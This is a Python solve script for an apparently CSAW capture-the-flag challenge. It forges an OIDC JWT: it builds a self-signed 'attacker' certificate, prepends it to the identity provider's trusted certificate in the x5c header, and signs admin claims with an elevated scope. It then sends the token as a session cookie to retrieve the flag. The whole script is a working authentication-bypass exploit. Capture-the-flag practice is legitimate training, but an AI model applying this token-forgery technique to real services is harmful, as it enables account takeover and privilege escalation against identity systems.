import base64
import datetime
import json
import re
from pathlib import Path

import jwt
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

BASE = "https://dino2auth.ctf.csaw.io"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}


def get_idp_cert(provider):
    r = requests.get(
        f"{BASE}/idp/{provider}/authorize",
        params={
            "client_id": "trustdinoidc-portal",
            "redirect_uri": f"{BASE}/oauth/callback",
            "scope": "openid profile freeosaurus:redeem",
            "state": "solve",
        },
        headers=HEADERS,
        timeout=15,
    )
    token = re.search(r'name="id_token" value="([^"]+)', r.text).group(1)
    header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
    return header["x5c"][0]


def make_attacker_cert(key, issuer):
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1))
        .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )
    return base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()


issuer = "strataid.example.com"
trusted_cert = get_idp_cert("strataid")
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
attacker_cert = make_attacker_cert(key, issuer)
claims = {
    "iss": issuer,
    "sub": "admin",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
    "exp": int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 3600,
}
token = jwt.encode(
    claims,
    key,
    algorithm="RS256",
    headers={"x5c": [attacker_cert, trusted_cert]},
)
Path("session-cookie.txt").write_text(token + "\n")

page = requests.get(
    f"{BASE}/",
    headers=HEADERS,
    cookies={"session": token},
    timeout=15,
)
page.raise_for_status()
flag = re.search(r"[A-Za-z0-9_]+\{[^{}]+\}", page.text)
if not flag:
    raise RuntimeError("flag not found")

path = Path("flag.txt")
if not path.exists():
    path.write_text(flag.group(0) + "\n")
    print("flag saved to flag.txt")
else:
    print("flag.txt already exists; not overwritten")
print("fresh cookie saved to session-cookie.txt")
